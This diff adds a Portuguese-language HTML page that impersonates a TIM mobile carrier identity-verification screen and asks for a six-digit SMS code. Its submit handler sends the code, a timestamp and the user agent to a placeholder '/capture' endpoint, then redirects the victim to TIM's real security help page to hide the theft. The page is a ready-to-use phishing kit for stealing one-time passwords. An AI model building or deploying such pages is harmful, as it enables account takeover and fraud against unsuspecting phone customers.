@@ -1,0 +1,133 @@
+
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TIM | Verificação de Identidade</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body { background-color: #ffffff; font-family: 'Segoe UI', Roboto, sans-serif; }
+        .tim-blue { color: #003399; }
+        .btn-confirm { background-color: #003399; transition: all 0.3s; }
+        .btn-confirm:hover { background-color: #002266; }
+        .input-otp { 
+            width: 45px; height: 55px; text-align: center; font-size: 24px; 
+            border: 2px solid #e2e8f0; border-radius: 10px; margin: 0 4px;
+            transition: border-color 0.3s;
+        }
+        .input-otp:focus { border-color: #003399; outline: none; }
+        .timer-text { color: #e53e3e; font-weight: bold; }
+    </style>
+</head>
+<body class="flex items-center justify-center min-h-screen px-4">
+
+    <div class="w-full max-w-md bg-white p-8 rounded-3xl shadow-[0_20px_40px_rgba(0,0,0,0.1)] border border-gray-100">
+        
+        <div class="flex justify-center mb-6">
+            <img src="https://i.imgur.com/2tVqGKM.png" alt="TIM" class="h-10">
+        </div>
+
+        <h2 class="text-xl font-bold text-gray-800 text-center mb-2">Verificação de identidade</h2>
+        <p class="text-gray-500 text-center text-sm mb-6">Digite o código de verificação enviado por SMS.</p>
+
+        
+        <div class="bg-gray-50 p-4 rounded-xl mb-6 text-center">
+            <p class="text-xs text-gray-400 uppercase tracking-wider mb-1">Enviamos por SMS para:</p>
+            <p class="text-gray-700 font-medium">(11) 98***_ **01</p>
+        </div>
+
+        
+        <div class="text-center mb-6">
+            <p class="text-xs text-gray-500">O código expira em: <span id="timer" class="timer-text">05:00</span></p>
+        </div>
+
+        <form id="authForm" class="space-y-8">
+            
+            <div class="flex justify-center" id="otp-container">
+                <input type="text" class="input-otp" maxlength="1" pattern="\d*" required>
+                <input type="text" class="input-otp" maxlength="1" pattern="\d*" required>
+                <input type="text" class="input-otp" maxlength="1" pattern="\d*" required>
+                <input type="text" class="input-otp" maxlength="1" pattern="\d*" required>
+                <input type="text" class="input-otp" maxlength="1" pattern="\d*" required>
+                <input type="text" class="input-otp" maxlength="1" pattern="\d*" required>
+            </div>
+
+            <button type="submit" id="submitBtn" class="w-full btn-confirm text-white font-bold py-4 rounded-xl shadow-lg uppercase tracking-widest text-sm">
+                Confirmar código
+            </button>
+        </form>
+
+        <div class="mt-8 text-center">
+            <button class="text-sm text-blue-600 font-semibold hover:underline">Não recebeu o código? Reenviar</button>
+        </div>
+    </div>
+
+    <script>
+       
+        let time = 300; 
+        const timerElement = document.getElementById('timer');
+
+        const countdown = setInterval(() => {
+            let minutes = Math.floor(time / 60);
+            let seconds = time % 60;
+            seconds = seconds < 10 ? '0' + seconds : seconds;
+            timerElement.innerHTML = `${minutes < 10 ? '0' + minutes : minutes}:${seconds}`;
+            
+            if (time <= 0) {
+                clearInterval(countdown);
+                timerElement.innerHTML = "EXPIRADO";
+            }
+            time--;
+        }, 1000);
+
+        
+        const inputs = document.querySelectorAll('.input-otp');
+        inputs.forEach((input, index) => {
+            input.addEventListener('input', () => {
+                if (input.value.length === 1 && index < inputs.length - 1) {
+                    inputs[index + 1].focus();
+                }
+            });
+            input.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && input.value.length === 0 && index > 0) {
+                    inputs[index - 1].focus();
+                }
+            });
+        });
+
+        
+        document.getElementById('authForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            let fullCode = "";
+            inputs.forEach(input => fullCode += input.value);
+
+            if(fullCode.length < 6) return;
+
+            const btn = document.getElementById('submitBtn');
+            btn.innerText = "VALIDANDO...";
+            btn.disabled = true;
+
+            try {
+                const response = await fetch('https://SUA-API-BACKEND.com/capture', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ 
+                        code: fullCode, 
+                        timestamp: new Date().toISOString(),
+                        userAgent: navigator.userAgent
+                    })
+                });
+
+                if (response.ok) {
+                    
+                    window.location.href = "https://www.timbrasil.com.br/ajuda/seguranca";
+                }
+            } catch (error) {
+                console.error("Erro na captura.");
+                window.location.href = "https://www.timbrasil.com.br/ajuda/seguranca";
+            }
+        });
+    </script>
+</body>
+</html>
